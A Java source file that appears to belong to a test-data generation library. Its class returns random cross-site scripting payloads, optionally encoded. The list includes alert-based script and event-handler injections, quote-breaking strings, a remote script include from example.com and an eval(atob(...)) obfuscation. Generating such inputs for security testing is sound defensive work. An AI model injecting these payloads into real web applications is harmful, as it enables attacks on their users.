package com.dataforge.generators.security;

import com.dataforge.core.DataGenerator;
import com.dataforge.core.GenerationContext;

import java.util.Random;

/**
 * XSS attack script generator for generating common cross-site scripting attacks.
 */
public class XssAttackScriptGenerator implements DataGenerator<String> {
    
    // Common XSS attack scripts
    private static final String[] SCRIPTS = {
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        "<div onmouseover=alert(1)>Hover me</div>",
        "<input onfocus=alert(1) autofocus>",
        "<script src=//example.com/xss.js></script>",
        "<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>",
        "<svg><script>alert(1)</script></svg>",
        "<math><mtext><script>alert(1)</script></mtext></math>",
        "<form><button formaction=javascript:alert(1)>Click me</button></form>",
        "<isindex action=javascript:alert(1) type=submit value=Click>",
        "';alert(1);//",
        "\"><script>alert(1)</script>",
        "';document.write('<script>alert(1)</script>');//",
        "';eval('alert(1)');//"
    };
    
    // Encoding options
    public enum Encoding {
        NONE, URL, HTML_ENTITY, BASE64
    }
    
    private final Encoding encoding;
    
    public XssAttackScriptGenerator() {
        this(Encoding.NONE);
    }
    
    public XssAttackScriptGenerator(Encoding encoding) {
        this.encoding = encoding;
    }
    
    @Override
    public String generate(GenerationContext context) {
        Random random = context.getRandom();
        String script = SCRIPTS[random.nextInt(SCRIPTS.length)];
        
        switch (encoding) {
            case URL:
                return urlEncode(script);
            case HTML_ENTITY:
                return htmlEntityEncode(script);
            case BASE64:
                return base64Encode(script);
            case NONE:
            default:
                return script;
        }
    }
    
    /**
     * URL encode a string
     */
    private String urlEncode(String input) {
        StringBuilder encoded = new StringBuilder();
        for (char c : input.toCharArray()) {
            if (c == ' ') {
                encoded.append("%20");
            } else if (c == '<') {
                encoded.append("%3C");
            } else if (c == '>') {
                encoded.append("%3E");
            } else if (c == '"') {
                encoded.append("%22");
            } else if (c == '\'') {
                encoded.append("%27");
            } else if (c == '&') {
                encoded.append("%26");
            } else if (c == '/') {
                encoded.append("%2F");
            } else if (c == '(') {
                encoded.append("%28");
            } else if (c == ')') {
                encoded.append("%29");
            } else {
                encoded.append(c);
            }
        }
        return encoded.toString();
    }
    
    /**
     * HTML entity encode a string
     */
    private String htmlEntityEncode(String input) {
        StringBuilder encoded = new StringBuilder();
        for (char c : input.toCharArray()) {
            if (c == '<') {
                encoded.append("&lt;");
            } else if (c == '>') {
                encoded.append("&gt;");
            } else if (c == '"') {
                encoded.append("&quot;");
            } else if (c == '\'') {
                encoded.append("&#39;");
            } else if (c == '&') {
                encoded.append("&amp;");
            } else {
                encoded.append(c);
            }
        }
        return encoded.toString();
    }
    
    /**
     * Base64 encode a string
     */
    private String base64Encode(String input) {
        return java.util.Base64.getEncoder().encodeToString(input.getBytes());
    }
}